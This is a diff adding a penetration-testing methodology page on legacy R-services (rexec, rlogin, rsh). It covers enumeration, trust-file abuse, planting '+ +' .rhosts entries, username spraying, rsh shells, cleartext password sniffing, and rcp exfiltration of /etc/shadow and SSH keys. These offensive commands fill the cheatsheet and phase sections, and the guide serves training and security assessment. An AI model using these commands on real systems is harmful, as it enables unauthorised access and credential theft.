@@ -1,0 +1,388 @@
+---
+title: R-Services - Ports 512, 513, 514
+description: Enumeration and attack methodology for legacy R-services on ports 512, 513, and 514, covering rexec, rlogin, rsh, trust files, user enumeration, cleartext sniffing, file transfer, and .rhosts abuse.
+openGraph:
+  title: "R-Services - Ports 512, 513, 514"
+  description: "Enumeration and attack methodology for legacy R-services on ports 512, 513, and 514, covering rexec, rlogin, rsh, trust files, user enumeration, cleartext sniffing, file transfer, and .rhosts abuse."
+  images:
+    - url: /imgs/rservices.jpg
+      width: 1672
+      height: 941
+      alt: R-Services - Ports 512, 513, 514
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "R-Services - Ports 512, 513, 514"
+  description: "Enumeration and attack methodology for legacy R-services on ports 512, 513, and 514, covering rexec, rlogin, rsh, trust files, user enumeration, cleartext sniffing, file transfer, and .rhosts abuse."
+  images:
+    - url: /imgs/rservices.jpg
+      width: 1672
+      height: 941
+      alt: R-Services - Ports 512, 513, 514
+      type: image/jpeg
+---
+
+# R-Services - Ports 512, 513, 514
+
+import { Callout } from 'nextra/components'
+
+
+## Cheatsheet
+
+```bash
+nmap -sV -sC -p512,513,514 <IP>
+
+# interact
+sudo apt install rsh-client rwho rusers
+
+rlogin -l <USER> <IP> # interactive clinet
+#single command client
+rsh -l <USER> <IP> 'uname -a; id; hostname'
+rsh -l <USER> <IP> '/bin/bash -i'
+rexec -l <USER> -p <PASS> <IP> id
+
+# remote copy 
+rcp <IP>:/etc/passwd ./
+rcp <IP>:/etc/shadow ./
+rcp <IP>:/home/<USER>/.ssh/id_rsa ./
+rcp ./payload.sh <IP>:/tmp/
+
+# Network user enumeration (rwho / rusers / finger)
+rwho -a
+rusers -al <IP>
+finger @<IP>
+
+# Plant a .rhosts entry for instant trust (requires write to target home)
+echo "+ +" > .rhosts                        # any user, any host
+echo "<LHOST> <USER>" > .rhosts             # specific attacker host + local user
+
+# Username spray via rsh (no lockouts, silent on trust failure)
+for u in $(cat users.txt); do rsh -l "$u" <IP> id 2>/dev/null && echo "[+] $u"; done
+
+# Cleartext sniffing
+sudo tcpdump -nn -A -i <IFACE> 'tcp port 512 or tcp port 513 or tcp port 514'
+```
+
+## Methodology
+
+<Callout type="important">
+R-services are extinct in hardened environments but still surface in three places: legacy Unix (Solaris, AIX, HP-UX), forgotten appliances, and CTF/exam machines that reward operators who remember pre-SSH protocols. When 512/513/514 are open, **you are almost certainly looking at a trust misconfiguration** — these services have no secure mode. Exhaust trust exploitation before anything else, and recycle every credential and username you find here against SSH and SMB.
+</Callout>
+
+### Phase 1: Fingerprint the Service
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which of the three daemons are actually live rexecd (512), rlogind (513), rshd (514)?
+  - What OS is this, and is r-services default-on (old Solaris/AIX) or deliberately enabled?
+  - Are the companion UDP services (rwhod on 513/UDP) reachable for user enumeration?
+</Callout>
+
+```bash
+nmap -sV -sC -p512,513,514 <IP>
+# Companion UDP services (rwhod = network user broadcasts)
+nmap -sU -p513,514 <IP>
+sudo apt install rsh-client rwho rusers
+```
+
+- [ ] `nmap -sV -sC -p512,513,514 <IP>` service detection reliably separates `exec` (512/rexecd), `login` (513/rlogind), and `shell` (514/rshd). All three open is the classic legacy footprint.
+- [ ] Note the OS hint r-services on modern Linux means an intentionally enabled legacy service or an embedded device; on old Solaris/AIX they may still be default-on.
+- [ ] `sudo apt install rsh-client rwho rusers` the clients are not preinstalled on any modern distro (Kali included). Without them you are reduced to raw-socket work.
+- [ ] `nmap -sU -p513,514 <IP>` 513/UDP is `rwhod` (network-wide logged-in users), 514/UDP is syslog (unrelated but often co-located).
+
+### Phase 2: Harvest Usernames
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which users are currently logged in, and from which hosts?
+  - Am I on the same broadcast domain to use `rwho`, or do I need per-host `rusers`?
+  - Which usernames have I already gathered from SMTP, SNMP, SMB RID cycling, or NFS?
+  - Why does a larger username list matter more here than against SSH?
+</Callout>
+
+```bash
+rwho -a
+rusers -al <IP>
+finger @<IP>
+```
+
+- [ ] `rwho -a` lists every user logged into every host broadcasting on the local segment. Requires same broadcast domain but returns a live user/host table with zero authentication.
+- [ ] `rusers -al <IP>` per-host query for logged-in users with TTY and idle time. Works remotely.
+- [ ] `finger @<IP>` try it even if port 79 was not flagged; admins who enable r-services rarely disable finger.
+- [ ] Cross-reference with every other username source: SMTP `VRFY`/`EXPN`, SNMP user tables, SMB RID cycling, NFS UID exports, `/etc/passwd` LFI leaks. Trust checks are silent on failure, so a large list costs nothing.
+
+<Callout type="info">
+User enumeration is far more valuable here than against SSH because rlogin/rsh return no authentication feedback  a trust failure is indistinguishable from a closed port. You cannot brute force passwords against rlogind/rshd at all. The entire attack surface is "is there any (user, host) tuple the target already trusts?", so every extra username is another combination to try against `.rhosts` and `hosts.equiv` instant and silent.
+</Callout>
+
+### Phase 3: Trust-Based Access (Zero Credentials)
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Does a forgotten `.rhosts` or `hosts.equiv` entry already trust me?
+  - Does `root` have a `.rhosts` file the highest-impact misconfiguration?
+  - Can I match the trusted source by changing my local username before spraying?
+  - Did a hit come via `rsh` (no PTY) do I need to upgrade to an interactive shell?
+</Callout>
+
+```bash
+# Start with root forgotten root .rhosts is the classic finding
+rlogin -l root <IP>
+rsh -l root <IP> id
+
+# Spray the username list (silent on failure, no lockout)
+for u in $(cat users.txt); do
+    rsh -l "$u" <IP> id 2>/dev/null && echo "[+] trust as $u"
+done
+
+# Upgrade an rsh hit to an interactive shell
+rsh -l <USER> <IP> '/bin/bash -i'
+```
+
+- [ ] Start with `root`: `rlogin -l root <IP>` and `rsh -l root <IP> id`. Forgotten root `.rhosts` files are the single most common r-services finding.
+- [ ] Spray the username list with the loop above. Any hit means `hosts.equiv` or that user's `~/.rhosts` matches your source host/IP plus your local username.
+- [ ] Widen coverage cheaply by matching your local username to a likely target before spraying (e.g. create and switch to a `root` local account), since trust keys on the *client-side* username.
+- [ ] On an `rsh` hit, upgrade: `rsh -l <USER> <IP> '/bin/bash -i'`. `rsh` allocates no PTY, so the shell is ugly stabilize it immediately after transfer.
+- [ ] Prefer `rlogin` when you want a proper TTY from the start and exam time matters.
+
+<Callout type="warning">
+**OPSEC:** Every rlogin/rshd connection is logged to syslog (`/var/log/messages`, `/var/log/auth.log`, or `/var/log/secure`). There is no rate-limiting you can spray a 10k list in minutes but log volume scales with attempts. In a mature SOC, *any* r-services traffic is almost certainly alerted on because the protocols are obsolete. Assume you are burning the box audibly the moment you touch 512/513/514.
+</Callout>
+
+### Phase 4: Plant Your Own Trust (Write-Anywhere → Shell)
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Do I have any primitive that writes into a user's home directory (NFS, FTP, SMB, web upload)?
+  - Can I satisfy the daemon's strict ownership and permission requirements on `.rhosts`?
+  - Does `no_root_squash` on an exported `/home` let me `chown` the planted file?
+  - Which user gives the fastest path to root once trust is planted?
+</Callout>
+
+```bash
+# Plant a .rhosts via an NFS write primitive, matching ownership
+echo "+ +" > /mnt/nfs/home/<USER>/.rhosts
+chmod 600 /mnt/nfs/home/<USER>/.rhosts        # must NOT be world-writable
+chown <USER>:<USER> /mnt/nfs/home/<USER>/.rhosts
+
+# Pivot instantly no password, no exploit chain
+rlogin -l <USER> <IP>
+```
+
+- [ ] Identify any write-to-home primitive.
+- [ ] Drop `.rhosts` containing `+ +` (any user, any host) or a precise `<LHOST> <USER>` pair into the target's home, using the commands above.
+- [ ] Match ownership exactly `chown` under `no_root_squash`, or write as the correct UID if UIDs are mapped. The daemon ignores a `.rhosts` it does not trust.
+- [ ] Pivot: `rlogin -l <USER> <IP>` instant shell, no password, no exploit beyond the file write.
+
+<Callout type="info">
+rshd refuses a `.rhosts` that is world-writable, not owned by the corresponding user, or a symbolic link  otherwise any local user could rewrite it to impersonate another account. This is why `no_root_squash` on a share containing `/home` is catastrophic: it turns NFS write access into an r-services root shell.
+</Callout>
+
+### Phase 5: rexec The Cleartext Password Trap
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Is only port 512/rexec open (the sibling that needs a password but sends it in cleartext)?
+  - Which harvested credentials should I try first before any spray?
+  - Do I have a network position to sniff the cleartext password instead?
+  - Is the extra log noise of authenticated failures worth it versus trust-based attacks?
+</Callout>
+
+```bash
+# Try harvested credentials first (rexec has no lockout)
+rexec -l <USER> -p <PASS> <IP> id
+
+# Sniff cleartext rexec passwords from a network position
+sudo tcpdump -nn -A -i <IFACE> 'tcp port 512'
+```
+
+- [ ] `rexec -l <USER> -p <PASS> <IP> id` try credentials harvested from every other service first. rexec authenticates with a username and cleartext password.
+- [ ] `sudo tcpdump -nn -A -i <IFACE> 'tcp port 512'` from any sniffing or MITM position (ARP poisoning, rogue AP, compromised gateway), every authenticated session reveals the password in plaintext.
+- [ ] rexec has no lockout, so multi-credential spraying works but it is noisier than trust-based attacks because it generates authentication-failure logs.
+
+### Phase 6: File Exfiltration and Lateral Staging (rcp)
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which high-value files can I pull now that trust is established (shadow, SSH keys, history)?
+  - Am I trusted as root, unlocking `/etc/shadow` and `/root`?
+  - How do I move multiple files when `rcp` has no server-side wildcard support?
+  - What staging tooling do I need to push for the post-access phase?
+</Callout>
+
+```bash
+# Pull high-value loot (shadow only if trusted as root)
+rcp <IP>:/etc/passwd ./
+rcp <IP>:/etc/shadow ./
+rcp <IP>:/home/<USER>/.ssh/id_rsa ./
+rcp <IP>:/root/.ssh/authorized_keys ./
+
+# Push staging tools, run, retrieve output
+rcp linpeas.sh <IP>:/tmp/
+rsh -l <USER> <IP> '/tmp/linpeas.sh > /tmp/lp.out'
+rcp <IP>:/tmp/lp.out ./
+
+# Multi-file pull when rcp wildcards fail tar over rsh
+rsh -l <USER> <IP> 'tar cf - /home/<USER>/.ssh' | tar xf -
+```
+
+- [ ] Exfiltrate `/etc/passwd`, SSH keys, `.bash_history`, and `/etc/shadow` (root trust only) with `rcp`. These feed credential cracking and reuse.
+- [ ] Push tooling the same way and run it via `rsh`, then pull the output back a complete scriptable transfer loop.
+- [ ] `rcp` has no server-side wildcard expansion; for multiple files either script per-file invocations or pipe `tar` over `rsh`.
+
+**Move to Phase 7** with your loot in hand. The trust files on this box are the map to the rest of the cluster.
+
+### Phase 7: Post-Access Map the Trust Graph
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - What does `/etc/hosts.equiv` declare this host trusts and is that trust reciprocal?
+  - Which users have personal `.rhosts` files, and what do they trust?
+  - Which hosts have admins actually been rlogin/rsh-ing to (history, `last`)?
+  - What credentials can I pillage here to spray onward to SSH and SMB?
+</Callout>
+
+```bash
+# System-wide and per-user trust files
+cat /etc/hosts.equiv
+find / -name ".rhosts" 2>/dev/null
+cat /home/*/.rhosts /root/.rhosts 2>/dev/null
+
+# Who has actually been using r-services
+last -a; w
+cat ~/.bash_history /root/.bash_history 2>/dev/null
+```
+
+- [ ] `cat /etc/hosts.equiv` every hostname listed is a candidate pivot in both directions; declared trust is usually reciprocal in automation clusters.
+- [ ] `find / -name ".rhosts" 2>/dev/null` then read each a line like `trusted-host username` means `username@trusted-host` logs in here passwordless, and the reverse is usually true too.
+- [ ] `last -a` and `w` which users actually use rlogin/rsh; live accounts are likelier to have valid trust entries elsewhere.
+- [ ] `cat /root/.bash_history` admins using `rsh` leave exact target hostnames in history, mapping the trust graph for you.
+
+<Quiz
+  question="You compromise a legacy Solaris jump box and find /etc/hosts.equiv listing 'devhost1', 'devhost2', and 'buildsrv'. Your current user is 'oracle'. What's the highest-value next move?"
+  options={[
+    "Dump /etc/shadow and start cracking hashes you have a shell, might as well get creds",
+    "rsh from here to devhost1/devhost2/buildsrv as your local users hosts.equiv usually implies reciprocal trust, so you likely have password-free access to all three",
+    "Scan the internal subnet for more r-services hosts with nmap",
+    "Upload LinPEAS and hunt for kernel exploits"
+  ]}
+  answer={1}
+  explanation="hosts.equiv is a trust declaration. In real deployments these relationships are nearly always reciprocal because they were built for cross-host automation (builds, batch jobs, shared scratch). You can almost certainly rsh from this box to each listed host with no authentication lateral movement to three new hosts in under a minute beats local privesc (D), slow hash cracking (A), or redundant scanning (C) when you already hold a confirmed trust graph. Always exhaust the trust graph before pivoting to other techniques."
+/>
+
+## Overview
+
+R-services are a family of BSD-derived remote access tools from the early 1980s that predate SSH by a decade. They were designed for a world where networks were physically secure and hosts could be identified by IP and hostname alone so they transmit everything in cleartext and authenticate via "I trust this hostname" files (`hosts.equiv`, `.rhosts`) rather than passwords. They were replaced by SSH and should never appear on a production network, but legacy Unix (Solaris, AIX, HP-UX), embedded devices, and intentionally vulnerable lab machines still ship them.
+
+| Port | Service | Daemon | Purpose | Auth Model |
+|------|---------|--------|---------|------------|
+| 512/TCP | rexec | rexecd | Remote command execution with password | Username + cleartext password |
+| 513/TCP | rlogin | rlogind | Remote interactive login (Telnet replacement) | Host/user trust files |
+| 514/TCP | rsh / rcp | rshd | Remote single-command execution, remote file copy | Host/user trust files |
+| 513/UDP | rwho | rwhod | Network-wide logged-in user broadcasts | None |
+| 514/UDP | syslog | syslogd | Log forwarding (unrelated protocol, same port) | None |
+
+<Callout type="info">
+rlogin, rsh, rcp, and rexec were deprecated in nearly all Linux distributions between 2005-2012. Debian removed them from the default install in etch (2007); RHEL removed the r-services server packages in RHEL 6. The clients are still packaged (`rsh-client`) but are never installed by default — Kali included. Run `apt install rsh-client rwho rusers` on a fresh box before this note's commands will resolve.
+</Callout>
+
+## Quick Reference
+
+| Task | Command |
+|------|---------|
+| Nmap scan | `nmap -sV -sC -p512,513,514 <IP>` |
+| Install clients (Kali) | `sudo apt install rsh-client rwho rusers` |
+| Remote login (trust) | `rlogin -l <USER> <IP>` |
+| One-shot command (trust) | `rsh -l <USER> <IP> <COMMAND>` |
+| Interactive shell via rsh | `rsh -l <USER> <IP> '/bin/bash -i'` |
+| Remote exec with password | `rexec -l <USER> -p <PASS> <IP> <COMMAND>` |
+| Download file | `rcp <IP>:<REMOTE_PATH> ./` |
+| Upload file | `rcp <LOCAL_PATH> <IP>:<REMOTE_PATH>` |
+| Users on local segment | `rwho -a` |
+| Users on a specific host | `rusers -al <IP>` |
+| Sniff cleartext rexec password | `sudo tcpdump -nn -A -i <IFACE> 'tcp port 512'` |
+
+## Trust Files
+
+R-services delegate authentication to two configuration files that exist on the **target** host. Understanding their precedence and syntax is essential because every attack on these protocols reduces to either exploiting an existing entry or planting a new one.
+
+### `/etc/hosts.equiv` System-Wide Trust
+
+Read at login time by `rlogind`/`rshd` before falling back to per-user `.rhosts`. If a match is found here, the login is accepted without a password **for any user on the system except root** (root always requires `~/.rhosts` even if `hosts.equiv` would otherwise grant it  the one safety rail).
+
+```text
+# Format: [+/-]hostname [+/-username]
+devhost1                 # any user from devhost1 can log in as any matching user
+buildsrv jenkins         # only jenkins@buildsrv can log in as jenkins
++ devhost2               # any user from devhost2
++ +                      # DANGER: any user from any host, as any user (except root)
+-badhost                 # explicitly denied
+```
+
+### `~/.rhosts` Per-User Trust
+
+Located in the target user's home directory. Grants access to **that specific account** regardless of `hosts.equiv`. Unlike `hosts.equiv`, a valid `.rhosts` entry **does** grant password-free root login (if found in `/root/.rhosts`), which is why forgotten root `.rhosts` files are the highest-impact misconfiguration.
+
+```text
+# Format: hostname [username]
+trusted-host alice       # alice@trusted-host can log in as the owning account
+10.10.14.5 attacker      # attacker@10.10.14.5 can log in
++ +                      # DANGER: literal any-any wildcard
+```
+
+| Entry | Meaning |
+|-------|---------|
+| `hostname username` | Specific user from specific host only |
+| `+ hostname` | Any user from specific host |
+| `hostname +` | Any user from specific host (equivalent syntax) |
+| `+ +` | Any user from any host the nuclear misconfiguration |
+| `-hostname` | Explicit deny |
+
+<Callout type="warning">
+`+ +` in either file is an instant full-trust bypass of all authentication for the owning account(s). It still appears in labs, ancient embedded devices, and copy-pasted quickstart guides from the 1990s. Check every `.rhosts` file you can read even if your source host is not explicitly listed, a lone `+` or `+ +` means you do not need to be.
+</Callout>
+
+## Dangerous Configurations
+
+| Configuration | Risk |
+|---------------|------|
+| `+ +` in `.rhosts` or `hosts.equiv` | Zero-auth access from anywhere worst case |
+| `+` wildcard (hostname or user) | Overly broad trust frequently leads to unintended exposure |
+| `.rhosts` owned by a service account | Gives the service account's trust surface to any exploit that reaches it |
+| World-readable `.rhosts` | Exposes the complete trust graph to every local user |
+| r-services daemons enabled at all | Cleartext transport sniffing yields credentials (rexec) and session data |
+| NFS export of `/home` with write access | Attacker can plant `.rhosts` into any user's home → instant trust |
+| rsh/rlogin permitted through firewall | External exposure of deprecated services usually a forgotten rule |
+
+## rexec vs rlogin vs rsh
+
+These three daemons are often lumped together but have meaningfully different attack properties.
+
+| Property | rexec (512) | rlogin (513) | rsh (514) |
+|----------|-------------|--------------|-----------|
+| Authentication | Cleartext username + password | `hosts.equiv` / `.rhosts` trust | `hosts.equiv` / `.rhosts` trust |
+| Session type | Single command | Interactive PTY | Single command (no PTY) |
+| Password on wire | Yes sniffable | No | No |
+| Brute forceable | Yes (noisy, logged) | No (trust-only) | No (trust-only) |
+| Lockouts | No | No | No |
+| Ideal for | Sniffing creds, credential spraying | Hands-on shell once trust exists | Scripted exploitation, username spraying |
+
+rsh is the operator's favorite for spraying no PTY means no login record in `wtmp` on some implementations, failed attempts are silent, and the daemon returns instantly. rlogin is more convenient once you have confirmed trust and want a real shell. rexec is the oddball: it passes a password with the command, which means it is the one r-service you can brute force or sniff.
+
+## Historical Context Why This Matters
+
+R-services are not just an academic curiosity. They are the **original vector of the Morris worm (1988)**, which propagated by exploiting trusted host relationships and forged `.rhosts` entries. They were the dominant Unix remote access mechanism until the release of OpenSSH in 1999. Every r-services weakness exploited today is the same weakness that forced the creation of SSH in the first place.
+
+When you encounter 512/513/514 on a real engagement, the appropriate finding severity is almost always **Critical** regardless of whether you successfully exploited them the mere presence of these services on a modern network indicates failed patch/hardening discipline and almost certainly correlates with other legacy vulnerabilities on the same host.
+
+
+<div className="flex flex-wrap gap-2 mb-4">
+  #PenetrationTesting #Linux #RedTeam #Certification #LegacyServices #NetworkSecurity #Unix 
+</div>
